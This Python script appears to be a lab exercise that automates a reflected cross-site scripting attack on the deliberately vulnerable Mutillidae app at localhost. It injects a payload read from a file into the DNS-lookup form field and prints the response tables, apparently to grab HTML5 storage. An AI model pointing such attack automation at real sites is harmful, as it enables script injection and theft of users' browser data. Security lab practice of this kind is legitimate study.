from bs4 import BeautifulSoup as BSoup
import re
import mechanize
import sys

class GetHTML5Storage():
	url = "http://127.0.0.1/mutillidae/index.php?page=dns-lookup.php"

	fd = open("reflectedXSS.txt","rb")

	raw_words = fd.readlines()

	fd.close()

	xss = raw_words[0] + raw_words[1] + raw_words[2]
	
	def __init__(self):
		
	
		
		self.br = mechanize.Browser(factory=mechanize.DefaultFactory(i_want_broken_xhtml_support=True))
        	self.br.set_handle_robots(False)
        	self.br.set_handle_refresh(False)
        	self.br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
		self.br.set_proxies({"http":"127.0.0.1:3128"})

	def close(self):
		self.br.close()

	def attack(self):
		
		if self.br == None:
			return

		_url = GetHTML5Storage.url
		xss = GetHTML5Storage.xss

		print " ### Opening %s ###\n"%_url
		self.br.open(_url)
		self.br.select_form(nr=0)
	#	text = self.br.form.find_control("idTargetHostInput")
	#	submit = self.br.form.find_control("dns-lookup-php-submit-button")

		self.br.form['target_host']= xss
		self.br.submit()

		

		

		bs = BSoup(self.br.response().read(),'lxml')
		
		table = bs.find_all('table')
		print table
	
	#	print "### Successful Login as %s ###"%thText

	


	

def main():


	attacker = GetHTML5Storage()
	attacker.attack()
	attacker.close()
	

if __name__ == "__main__":
	main()	
